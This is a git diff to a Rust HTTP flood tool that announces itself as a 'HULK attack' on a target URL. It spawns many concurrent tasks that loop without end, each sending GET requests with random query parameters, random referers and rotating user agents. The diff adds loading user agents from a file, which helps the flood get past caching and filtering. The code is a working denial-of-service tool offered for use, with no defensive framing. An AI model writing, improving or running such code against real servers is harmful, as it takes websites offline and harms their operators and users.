@@ -5,8 +5,10 @@ use hyper::{Body, Client, Request};
 use hyper_tls::HttpsConnector;
 use rand::distributions::Alphanumeric;
 use rand::{thread_rng, Rng};
-use std::io;
-use std::io::Write;
+use std::{io, 
+    fs::File,
+    io::{prelude::*, BufReader, Write},
+    path::Path,};
 use std::sync::atomic::{AtomicUsize, Ordering};
 
 static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
@@ -50,6 +52,15 @@ struct CliArguments {
     parameter_name: Option<String>, 
 }
 
+fn lines_from_file(filename: impl AsRef<Path> + std::marker::Copy) -> Vec<String> {
+    let file = File::open(filename).expect(format!("No such file: {}", filename.as_ref().display()).as_str());
+    let buf = BufReader::new(file);
+    buf.lines()
+        .map(|l| l.expect("Could not parse line"))
+        .filter(|x| !x.is_empty())
+        .collect()
+}
+
 fn random_string(n: usize) -> String {
     thread_rng()
         .sample_iter(&Alphanumeric)
@@ -66,11 +77,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     //     fetch_url(args.target.clone(), x)
     // });
     // join_all(tasks).await;
+    let user_agents = if let Some(user_agents_file) = args.user_agents_file {
+        lines_from_file(user_agents_file.as_str())
+    } else {
+        USER_AGENTS.iter().map(|x| x.to_string()).collect()
+    };
+    println!("{:?}", user_agents);
     println!("[*] Starting HULK attack on {}", args.target);
     let tasks = (0..args.max_connections).map(|x| {
         let target = args.target.clone();
         let parameter_name = args.parameter_name.clone();
-        tokio::spawn(async move { fetch_url(target, args.verbose, parameter_name, x).await })
+        let user_agents = user_agents.clone();
+        tokio::spawn(async move { fetch_url(target, args.verbose, parameter_name, user_agents, x).await })
     });
     join_all(tasks).await;
 
@@ -81,27 +99,28 @@ async fn fetch_url(
     target: String,
     verbose: bool,
     parameter_name: Option<String>,
+    user_agents: Vec<String>,
     _thread: usize,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let https = HttpsConnector::new();
     let client = Client::builder().build::<_, hyper::Body>(https);
-
+    let user_agents_len = user_agents.len();
     loop {
         let uri = if target.contains("?") {
             format!("{}&{}={}", target, parameter_name.as_deref().unwrap_or(random_string(10).as_str()), random_string(10))
         } else {
             format!("{}?{}={}", target, parameter_name.as_deref().unwrap_or(random_string(10).as_str()), random_string(10))
         };
-        println!("[*] Fetching {}", uri);
         let referer = format!(
             "{}{}",
             REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())],
             random_string(rand::thread_rng().gen_range(5..10))
         );
+        let user_agent = user_agents[rand::thread_rng().gen_range(0..user_agents_len)].clone();
         let request = Request::get(uri)
             .header(
                 "User-Agent",
-                USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())],
+                user_agent
             )
             .header("Referer", referer)
             .body(Body::empty())?;
